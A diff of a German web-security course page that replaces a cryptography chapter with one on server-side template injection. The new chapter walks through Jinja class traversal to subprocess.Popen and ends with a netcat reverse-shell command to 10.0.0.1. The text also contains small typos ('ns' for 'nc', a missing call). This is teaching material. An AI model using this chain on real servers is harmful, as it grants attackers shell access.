@@ -9,10 +9,10 @@
       
       
       
-        <link rel="prev" href="../integration/">
+        <link rel="prev" href="../http-request-smuggling/">
       
       
-        <link rel="next" href="../../web-applications/web_technologies/">
+        <link rel="next" href="../../client-side-attacks/client_side_attacks/">
       
       
       <link rel="icon" href="../../assets/images/favicon.png">
@@ -20,7 +20,7 @@
     
     
       
-        <title>Kryptographische Grundlagen - Web Application Security</title>
+        <title>SSTI - Web Application Security</title>
       
     
     
@@ -72,7 +72,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#kryptographische-grundlagen" class="md-skip">
+        <a href="#server-side-template-injection-ssti" class="md-skip">
           Zum Inhalt
         </a>
       
@@ -108,7 +108,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Kryptographische Grundlagen
+              SSTI
             
           </span>
         </div>
@@ -266,8 +266,6 @@
       
   
   
-    
-  
   
   
     
@@ -279,11 +277,11 @@
       
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
         
           
           <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
@@ -298,7 +296,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_3">
             <span class="md-nav__icon md-icon"></span>
             Einführung
@@ -312,7 +310,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../security_principles/" class="md-nav__link">
+      <a href="../../introduction/security_principles/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -334,7 +332,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../security_as_process/" class="md-nav__link">
+      <a href="../../introduction/security_as_process/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -356,7 +354,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../integration/" class="md-nav__link">
+      <a href="../../introduction/integration/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -375,31 +373,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  <span class="md-ellipsis">
-    Kryptographische Grundlagen
-    
-  </span>
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../../introduction/crypto_basics/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -409,80 +386,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Inhaltsverzeichnis">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Inhaltsverzeichnis
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#verschlusselung" class="md-nav__link">
-    <span class="md-ellipsis">
-      Verschlüsselung
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#block-und-stream-cipher" class="md-nav__link">
-    <span class="md-ellipsis">
-      Block- und Stream-Cipher
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#integritatsschutz" class="md-nav__link">
-    <span class="md-ellipsis">
-      Integritätsschutz
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#zufallszahlen" class="md-nav__link">
-    <span class="md-ellipsis">
-      Zufallszahlen
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#weitere-informationsquellen" class="md-nav__link">
-    <span class="md-ellipsis">
-      Weitere Informationsquellen
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#reflektionsfragen" class="md-nav__link">
-    <span class="md-ellipsis">
-      Reflektionsfragen
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -727,8 +630,10 @@
       
   
   
+    
   
   
+  
     
     
     
@@ -738,11 +643,11 @@
       
     
     
-    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" checked>
         
           
           <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="">
@@ -757,7 +662,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_6">
             <span class="md-nav__icon md-icon"></span>
             Server-Seitige Angriffe
@@ -771,7 +676,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../server-side-attacks/allgemein/" class="md-nav__link">
+      <a href="../allgemein/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -793,7 +698,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../server-side-attacks/file-uploads/" class="md-nav__link">
+      <a href="../file-uploads/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -815,7 +720,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../server-side-attacks/path-traversals/" class="md-nav__link">
+      <a href="../path-traversals/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -837,7 +742,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../server-side-attacks/command-injections/" class="md-nav__link">
+      <a href="../command-injections/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -859,7 +764,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../server-side-attacks/database-injections/" class="md-nav__link">
+      <a href="../database-injections/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -881,7 +786,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../server-side-attacks/ldap-injections/" class="md-nav__link">
+      <a href="../ldap-injections/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -903,7 +808,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../server-side-attacks/type-juggling/" class="md-nav__link">
+      <a href="../type-juggling/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -925,7 +830,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../server-side-attacks/xml-based-attacks/" class="md-nav__link">
+      <a href="../xml-based-attacks/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -947,7 +852,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../server-side-attacks/serialization-attacks/" class="md-nav__link">
+      <a href="../serialization-attacks/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -969,7 +874,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../server-side-attacks/http-request-smuggling/" class="md-nav__link">
+      <a href="../http-request-smuggling/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -988,10 +893,31 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../../server-side-attacks/SSTI/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    SSTI
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   <span class="md-ellipsis">
@@ -1001,6 +927,44 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Inhaltsverzeichnis">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Inhaltsverzeichnis
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#beispiel-template-system-jinja-python" class="md-nav__link">
+    <span class="md-ellipsis">
+      Beispiel Template System: Jinja (Python)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploitation
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -1246,54 +1210,18 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#verschlusselung" class="md-nav__link">
+  <a href="#beispiel-template-system-jinja-python" class="md-nav__link">
     <span class="md-ellipsis">
-      Verschlüsselung
+      Beispiel Template System: Jinja (Python)
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#block-und-stream-cipher" class="md-nav__link">
+  <a href="#exploitation" class="md-nav__link">
     <span class="md-ellipsis">
-      Block- und Stream-Cipher
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#integritatsschutz" class="md-nav__link">
-    <span class="md-ellipsis">
-      Integritätsschutz
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#zufallszahlen" class="md-nav__link">
-    <span class="md-ellipsis">
-      Zufallszahlen
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#weitere-informationsquellen" class="md-nav__link">
-    <span class="md-ellipsis">
-      Weitere Informationsquellen
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#reflektionsfragen" class="md-nav__link">
-    <span class="md-ellipsis">
-      Reflektionsfragen
+      Exploitation
     </span>
   </a>
   
@@ -1318,197 +1246,115 @@
   
 
 
-<h1 id="kryptographische-grundlagen">Kryptographische Grundlagen</h1>
-<p>Kryptographie beschreibt die Technik (und Kunst) über
-nicht-vertrauenswürdige Kanäle bzw. Speicherorte Daten integritäts- und
-vertraulichkeitsgesichert zu übertragen. Dadurch kann Kryptographie als
-Mittel gegen <em>spoofing</em>, <em>tampering</em>, <em>repudiation</em> und <em>information
-disclosure</em> dienen. Dieses Kapitel soll eine (extrem) kurze Einführung
-in die, in diesem Dokument, verwendeten Konzepte geben.</p>
-<p>Bei der Verschlüsselung wird der ursprüngliche Text (häufig <em>plaintext</em>
-genannt) durch den Algorithmus in einen neuen, verschlüsselten, Text
-(häufig <em>ciphertext</em> genannt) konvertiert. Dieser Ciphertext kann durch
-die Entschlüsselung wieder in den Plaintext zurück verwandelt werden.
-Die hierbei verwendeten Algorithmen werden häufig <em>Cipher</em> genannt. In
-der Literatur werden die dabei beteiligten Partein meistens ident
-benannt: <em>Alice</em> und <em>Bob</em> sind die beiden Parteien die miteinander
-sicher kommunizieren wollen. <em>Eve</em> ist ein Angreifer, der diese
-Nachrichten abhören, aber nicht modifizieren kann; <em>Mallory</em> ist ein
-Angreifer, der auch aktiv angreifen darf.</p>
-<p>Grundlegend sollten folgende Grundsätze bei der Verwendung von
-Kryptographie beachtet werden:</p>
+<h1 id="server-side-template-injection-ssti">Server-Side Template Injection (SSTI)</h1>
+<p>Web-Applikationen verwenden Template-Engines um dynamische Inhalte zu
+präsentieren. Anstatt eine Seite starr zu kodieren, wird ein Template
+server-seitig in einer Datenbank gespeichert (z.B. als String/Text).
+Wird die Seite angezeigt, wird das Template mit den aktuellen Daten
+kombiniert und die resultierende Seite angezeigt. Häufig können
+eingeloggte Benutzer (im Folgenden Autoren genannt) Templates
+server-seitig modifizieren und auf diese Weise das Layout modifizieren.</p>
+<p>Durch die Verwendung von Templates ergeben sich Vorteile:</p>
 <ul>
 <li>
-<p>Niemals selbst ein kryptographisches System entwerfen, sondern immer
-  ein etabliertes (und getestetes) System verwenden.</p>
+<p>Content-Autoren können Templates modifizieren (z.B. mittels eines
+  WYSIWYG–Editor innerhalb des Administrationsbereichs) ohne auf den
+  Source-Code der Applikation Zugriff zu benötigen.</p>
 </li>
 <li>
-<p>Niemals selbst einen kryptographischen Algorithmus/Bibliothek
-  implementieren, sondern immer etablierte und getestet Komponenten
-  verwenden.</p>
+<p>Die verwendeten Template-Sprachen sind zumeist einfacher als
+  ,,volle” Programmiersprachen und können daher auch leichter
+  angelernt werden und erlauben es so einem größeren Benutzerkreis die
+  Inhalte der Webseite zu modifzieren.</p>
 </li>
 <li>
-<p>Die richtige kryptographische Methode wählen.</p>
-</li>
-<li>
-<p>Immer davon ausgehen, dass der eigene Source Code früher oder später
-  öffentlich wird. Aus diesem Grund darf ein kryptographischer
-  Schlüssel (oder auch Credentials) niemals Teil des Source Codes
-  werden.</p>
-</li>
-<li>
-<p>Essentiell zur sicheren Verwendung der verschiedenen
-  kryptographischen Methoden sind die dabei verwendeten Schüssel.
-  Diese müssen sowohl sicher gespeichert als auch transportiert
-  werden. Noch komplexer ist das Herstellen eines Vertrauensverhältnis
-  (Trust) zwischen den jeweiligen Kommunikationspartnern: woher weiss
-  ein Partner, dass ein vorhandener Schlüssel eines anderen
-  Kommunikationsparters vertrauenswürdig ist? Key Management ist
-  komplex und sollte nicht unterschätzt werden!</p>
+<p>Die Daten, auf welche ein Template zugreifen kann, können limitiert
+  werden. Auf diese Weise können Content-Autoren nur auf ein Subset
+  der server-seitigen Daten zugreifen.</p>
 </li>
 </ul>
-<p>Jede implementierte und konfigurierbare kryptographische Methode erhöht
-potentiell die Angriffsoberfläche. Ein Beispiel hierfür ist z. B. die
-OpenSSL-Bibliothek die dutzende Algorithmen implementiert. Als
-Alternative sind in den letzten Jahren kryptographische Bibliotheken wie
-<em>NaCl</em> (“salt”) entstanden, die für jede kryptographische Methode genau
-eine sichere Implementierung anbieten. Auf diese Weise sollen
-Selektionsfehler durch Entwickler vermieden werden.</p>
-<p>Ein häufiger verwendeter Begriff ist <em>Rubber Hose Cryptography</em>. Ein
-noch so technisch sicheres kryptographisches System kann durch bezahlte
-Schläger mit einem Gummischlauch und der Androhung von Gewalt, falls das
-Opfer nicht den privaten Schlüssel mitteilt, günstig gebrochen werden.
-Anstatt durch Androhung von Gewalt kann <em>Rubber Hose Cryptography</em> auch
-auf andere Aspekte eines Schlüsselträgers abzielen: Geld, Ideologie,
-Coersion oder Ego (Sex sells).</p>
-<h2 id="verschlusselung">Verschlüsselung</h2>
-<p>Zur Wahrung der Vertraulichkeit von Daten wird Verschlüsselung
-eingesetzt. Bei dieser wird der Originaltext (engl. <em>plaintext</em>) in
-einen verschlüsselten Text (engl. <em>ciphertext</em>) konvertiert. Dieser kann
-wieder durch den Entschlüsselungs-Vorgang in den Originaltext zurück
-verwandelt werden. Verschlüsselungsalgorithmen können in zwei Familien
-eingeteilt werden: symmetrisch und asymmetrisch (auch public-key
-encryption genannt). Bei symmetrischer Verschlüsselung wird zum ver- und
-entschlüsseln der idente Schlüssel verwendet. Problematisch hierbei ist,
-dass dieser geteilte geheime Schlüssel initial zwischen allen
-Beteiligten verteilt werden muss. Bei der asymmetrischen Verschlüsselung
-wird statt einem geteilten Schlüssel ein Schlüsselpaar[1] verwendet.
-Dieses besteht aus einem öffentlichen Schlüssel der zur Verschlüsselung
-dient und einem zugehörigen privaten Schlüssel der zum Entschlüsseln
-verwendet wird. Dadurch wird die Problematik des initialen
-Schlüsselverteilens entschärft, da nur öffentliche Schlüssel verteilt
-werden müssen (diese dürfen veröffentlicht bzw. verloren werden). Ein
-Nachteil asymmetrischer Verschlüsselung gegenüber symmetrischer
-Verschlüsselung ist, dass sie langsamer als symmetrische Verschlüsselung
-ist.</p>
-<h2 id="block-und-stream-cipher">Block- und Stream-Cipher</h2>
-<p>Eine weitere Unterscheidungsmöglichkeit für Verschlüsselungsalgorithmen
-ist die in <em>block</em> und <em>stream</em> ciphers. Bei Blockciphern werden zuerst
-Daten angehäuft (“ein Block” an plain-data) und dann dieser Block
-verschlüsselt. Bei einem Streamcipher wird jedes Zeichen sofort
-verschlüsselt, das Sammeln von Blocken wird so vermieden. Während
-Stream-Ciphers teilweise einfacher für Programmierer in ihrer Verwendung
-sind, werden aus Effizienzgründen fast ausschließlich Blockcipher
-verwendet. Werden zwei idente Blöcke mit dem identen Schlüssel
-verschlüsselt, würden idente verschlüsselte Blöcke entstehen. Dies
-erlaubt es einem Angreifer, strukturelle Informationen aus
-verschlüsselten Dokumenten zu extrahieren. Um dies zu vermeiden werden
-so genannte <em>Block Modes</em> verwendet um sicherzustellen, dass idente
-plain-text Blöcke unterschiedliche cipher-text Blöcke produzieren. Bei
-Auswahl des Block Modes sollten GCM-Modes (bzw. AEAD-Varianten)
-bevorzugt und ECB bzw. CBC Modes vermieden werden.</p>
-<h2 id="integritatsschutz">Integritätsschutz</h2>
-<p>Verschlüsselung gewährleistet nicht automatisch die Integrität der
-verschlüsselten Daten. Hierfür müssen eigene Algorithmen verwendet
-werden. Häufig vorgefunden werden Hashes, Message Authentication Codes
-(MACs) und Signaturen. Vereinfacht ausgedruckt berechnen Hashes
-ausgehend von beliebig langen Eingangsdaten eine Checksumme konstanter
-Größe. Wird ein Hash auf identen Eingangsdaten angewandt, wird auch ein
-identer Hash berechnet. Ein Hash ist eine Einwegfunktion: während der
-zugehörige Hash zu einem Eingangsdatum schnell berechnet werden kann
-(gegeben den ursprünglichen Daten), ist das Berechnen der Eingangsdaten
-ausgehend von einem Hash realistisch nicht möglich.</p>
-<p>Bei einem Message Authentication Code (MAC) wird der Hash um ein
-geheimes geteiltes Passwort erweitert. Zur Berechnung bzw. Validierung
-eines MACs wird dieses Passwort benötigt. Analog zur symmetrischen
-Verschlüsselung ergibt sich hier die Problematik der
-Schlüsselverteilung. Signaturen lösen dieses Problem indem sie
-asymmetrische (public-key) Verschlüsselung einsetzen. Bei ihnen kann die
-Checksumme (Signature) mit Hilfe des privaten Schlüssels erstellt und
-mit Hilfe des öffentlichen Schlüssels verifiziert werden. Dadurch
-entfällt das Problem der Schlüsselverteilung, allerdings wird auch hier
-der Vorteil durch geringere Geschwindigkeit erkauft.</p>
-<p>Je nach Einsatzbereich muss nun ein geeignetes Verfahren zur
-Integritätssicherung und Verschlüsselung gewählt werden. Werden Daten
-über ein öffentliches bzw. feindliches Netzwerk transferiert ist z. B.
-der Einsatz eines Hashes problematisch. Falls ein Angreifer einen
-Datensatz abfangen und modifizieren kann, kann er ebenso einen neuen
-Hash berechnen und so den Integritätsschutz umgehen. Bei diesem Beispiel
-wäre der Einsatz eines MACs oder von Signaturen sinnvoller.</p>
-<h2 id="zufallszahlen">Zufallszahlen</h2>
-<p>Bei der korrekten Verwendung von kryptographischen Methoden ist der
-Einsatz guter Zufallszahlengenerator essentiell. Dieser sollte
-Zufallszahlen mit hoher Entropie generieren. Dies kann z. B. durch
-Einsatz eines Hardware-Zufallsgenerators sichergestellt werden. Ist ein
-solcher nicht verfügbar, muss ein kryptographisch sicherer
-Pseudo-Zufallszahlengenerator (PRNG) verwendet werden. Moderne
-Betriebssysteme bieten zumeist hybride Lösungen an: hierbei werden zwar
-PRNGs verwendet, diese allerdings mit Entropie aus weiteren Quelle[2]
-angereichert.</p>
-<p>Die Qualität der generierten Zufallszahlen kann über deren Entropie
-bestimmt werden. Hierbei wird über statistische Methoden die Qualität
-der Zufälligkeit der generierten Karten ermittelt.</p>
-<h2 id="weitere-informationsquellen">Weitere Informationsquellen</h2>
-<p>Entwickler benötigen Guidance zur Selektion der jeweiligen
-kryptographischen Algorithmen, hier eine kleine Auswahl öffentlich
-verfügbarer Dokumente:</p>
-<ol>
-<li>
-<p>Das amerikanische NIST gibt Empfehlungen für Cryptographical
-   Standards ab, z. B. <a href="https://csrc.nist.gov/publications/detail/sp/800-175b/final">SP-800-175B</a>. Aufgrund der Zusammenarbeit des
-   NIST mit der amerikanischen NSA bei zu vorigen Crypto-Standards
-   (Vermutung der Platzierung einer Backdoor in einen
-   Random-Number-Generator) wird mittlerweile gerne von den
-   NIST-Empfehlungen abgesehen.</p>
-</li>
-<li>
-<p>Die europäische ENISA gibt regelmäßig Empfehlungen zu verwendeten
-   kryptographischen Standards und Schlüssellängen ab (<a href="https://www.enisa.europa.eu/publications/algorithms-key-size-and-parameters-report-2014">Algorithms, key
-   size and parameter report 2014</a>). Während diese relativ gut sind,
-   ist die Frequenz der Veröffentlichung für IT-Verhältnisse etwas
-   behäbig (4-5 Jahre).</p>
-</li>
-<li>
-<p>Das deutsche Bundesamt für Sicherheit in der Informationstechnik
-   (BSI) bietet häufig überarbeitete Empfehlungen zum Einsatz
-   kryptographischer Methoden an (<a href="https://www.bsi.bund.de/DE/Publikationen/TechnischeRichtlinien/tr02102/index_htm.html">BSI TR-02102</a>). Diese sind relativ
-   aktuell und klassifizieren Algorithmen in sichere Algorithmen die
-   bei aktuellen Neuentwicklungen verwendet werden sollen und in
-   legacy-Algorithmen, die zwar nicht mehr bei Neuentwicklungen
-   verwendet werden sollten, die aber bei bestehender Software durchaus
-   weiterverwendet werden können.</p>
-</li>
-<li>
-<p><a href="https://www.bettercrypto.org">BetterCrypto.org</a> bietet regelmäßig upgedatete
-   Beispielskonfigurationen für geläufige Webserver. Diese sollten dazu
-   dienen, dass ein Administrator diese Snippets direkt in die
-   Konfiguration eines Webservers kopieren können und dadurch eine
-   sichere Konfiguration erreicht wird.</p>
-</li>
-</ol>
-<h2 id="reflektionsfragen">Reflektionsfragen</h2>
-<ol>
-<li>
-<p>Welche Grundideen sollten bei dem Entwurf und Einsatz
-   kryptographischer Methoden angewandt werden?</p>
-</li>
-<li>
-<p>Wann sollte ein MAC verwendet werden? Stelle diesen einem Hash oder
-   einer kryptographsichen Signatur gegenüber.</p>
-</li>
-</ol>
-<p>[1] Das Schlüsselpaar ist mathematisch “verwandt”.</p>
-<p>[2] Z. B. aus CPU-Zufallszahlengeneratoren, etc.</p>
+<p>Natürlich ergeben sich auch Angriffsmöglichkeiten. Kann ein Angreifer
+ein Template modifizieren und anschließend zur Ausführung bringen,
+besitzt er die Möglichkeit am Server Code (innerhalb der
+Template-Engine) auszuführen. Nun benötigt er noch die Möglichkeit, aus
+dem Template-System auszubrechen und in der zugrunde liegenden Umgebung
+(z.B. in die Web-Applikation) Befehle auszuführen. Dies wäre dann eine
+Remote Command Execution (RCE).</p>
+<h2 id="beispiel-template-system-jinja-python">Beispiel Template System: Jinja (Python)</h2>
+<p>Eine häufig verwendete Template Engine in Python-basierten
+Web-Applikationen ist Jinja[8]. In einem Template werden primär zwei
+verschiedene Kommando-Tags zum Inkludieren von Daten bzw. Kommandos
+verwendet:</p>
+<div class="highlight"><pre><span></span><code><span class="x">&lt;ul&gt;</span>
+<span class="x">    </span><span class="cp">{%</span> <span class="k">for</span> <span class="nv">item</span> <span class="k">in</span> <span class="nv">somelist</span> <span class="cp">%}</span>
+<span class="x">      &lt;li&gt; </span><span class="cp">{{</span> <span class="nv">item</span> <span class="cp">}}</span><span class="x"> &lt;/li&gt;</span>
+<span class="x">    </span><span class="cp">{%</span> <span class="k">endfor</span> <span class="cp">%}</span>
+<span class="x">&lt;/ul&gt;</span>
+</code></pre></div>
+<p>Dieses Jinja/HTML-Fragment baut eine Aufzählungsliste (mittels dem
+ul-Tag). Es verwendet Template-Tags um eine Python-for-Schleife zu
+inkludieren. Diese Schleife iteriert über die somelist Liste und
+inkludiert jedes Item in einem li-Element.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>In einem typischen Szenario hat der Angreifer bereits Zugriff auf ein
+System erlangt und kann sowohl ein Template bearbeiten als auch
+ausführen. Dies kann z.B. durch Erlangen eines CMS-Autor-Accounts
+innerhalb der Weboberfläche geschehen. Innerhalb dieser Oberfläche kann
+der Angreifer ein Template (z.B. für versendete Emails) modifizieren als
+auch, z.B. als ,,Preview”, anzeigen (und dadurch das Template zur
+Exekution bringen).</p>
+<p>Der Angreifer verwendet hierfür z.B. die gezeigen {{ …}} Tags. Er
+besitzt allerdings nur Zugriff auf Objekte, welche in das Template vom
+System hinein übergeben wurden. Bei unserem Beispiel wäre dies die Liste
+somelist. Hier kann er allerdings das Python-Typsystem ausnutzen um
+Zugriff auf weitere Objekte zu erlangen. Schlussendlich will der
+Angreifer zu einem Objekt bzw. zu einer Klasse gelanten, welche ihm die
+Ausführung von Code am Server erlaubt.</p>
+<p>In Python kann über das Attribut __class__ auf die Klasse eines
+Objekts zugegriffen werden, die Methode mro liefert sowohl die eigene
+Klasse als auch alle Elternklassen eines Objektes:</p>
+<div class="highlight"><pre><span></span><code><span class="n">somelist</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">]</span>
+<span class="n">somelist</span><span class="o">.</span><span class="vm">__class__</span>         <span class="c1"># -&gt; &lt;type &#39;list&#39;&gt;</span>
+<span class="n">somelist</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">mro</span><span class="p">()</span>   <span class="c1"># -&gt; [&lt;type &#39;list&#39;&gt;, &lt;type &#39;object&#39;&gt;]</span>
+<span class="n">obj_class</span> <span class="o">=</span> <span class="n">somelist</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">mro</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span>
+</code></pre></div>
+<p>Somit erhaltne wir über ,,somelist.__class__.mro()” alle Klassen
+(inklusive vererbter Klassen) des Objekts ,,somelist”. In Python erben
+alle Klassen von der Elternklasse ,,Object” welche wir über die
+Array-Position 1 selektieren und der Variablen ,,obj_class” zuweisen.
+Klassen in Python besitzen die Methode ,,__subclasses__” welche eine
+Liste von allen aktuell bekannten Subklassen zurück liefert. Diese Liste
+ist dynamisch sowohl die Elemente, als auch die Reihung jener, kann zur
+Laufzeit variieren.</p>
+<p>Ein Angreifer kann diese Liste ausgeben und eine potentiell verwundbare
+Klasse, wie z.B. ,,subprocess.Popen” suchen und über den Index diese
+Klasse selektionen. Nehmen wir an, dass diese Klasse in unserem Beispiel
+auf Array Position 42 vorhandne war. Durch Hinzufügen von ,,()” wird nun
+der Konstruktor der Klasse aufgerufen, hierbei können Parameter
+angegeben werden. Bei ,,Popen” kann ein Array mit Parametern übergeben
+werden. Diese werden zusammenkopiert und beim Aufruf des Konstruktors
+als Systemkommando ausgeführt:</p>
+<div class="highlight"><pre><span></span><code><span class="n">obj_class</span> <span class="o">=</span> <span class="n">somelist</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">mro</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">obj_class</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">42</span><span class="p">]</span>   <span class="c1"># -&gt; &lt;class &#39;subprocess.Popen&#39;&gt;</span>
+<span class="n">obj_class</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">[</span><span class="mi">42</span><span class="p">]([</span><span class="s2">&quot;nc&quot;</span><span class="p">,</span> <span class="s2">&quot;10.0.0.1&quot;</span><span class="p">,</span> <span class="s2">&quot;443&quot;</span><span class="p">,</span> <span class="s2">&quot;-e&quot;</span><span class="p">,</span> <span class="s2">&quot;/bin/sh&quot;</span><span class="p">])</span>
+</code></pre></div>
+<p>Bei diesem Beispiel wird somit als Kommando <code>ns 10.0.0.1 443 -e /bin/sh</code> aufgerufen: dieses Kommando baut eine reverse-shell auf, ein
+Angreifer erhält auf diese Weise Shell-Zugriff auf den Server mit den
+Rechten der Web-Applikation.</p>
+<p>Webapplikationen versuchen häufig, Benutzereingaben in Templates auf
+Schadcode hin zu überprüfen. Dies ist problematisch da Templates viele
+Möglichkeiten bieten, Schadcode zu verschleiern und auf diese Weise
+Absicherungen zu umgehen[9]. Als Angreifer sucht man in diesem Fall am
+Besten nach ,,bypass” und dem Namen der verwendeten Template-Engine.</p>
+<p>Ein Exploit gegen ein Template-System kann selten zu 100% statisch
+erfolgen da die Liste der Subklassen von ,,Object” dynamisch ist: sowohl
+die Elemente als auch deren Position ist von der Laufzeitumgebung
+abhängig und kann sich bei jedem Start der Webapplikation verändern. Ein
+Angreifer wird daher zumeist mehrstufig vorgehen und nach Erlangen des
+Zugriffs auf das CMS initial versuchen aussichtsreiche Objekt-Klassen
+und deren Position (im Subklassen-Array) zu identifizieren. Anschließend
+wird er versuchen, erfolgversprechende Klassen zu instanzieren und auf
+diese Weise Schadcode auszuführen.</p>
 
 
 
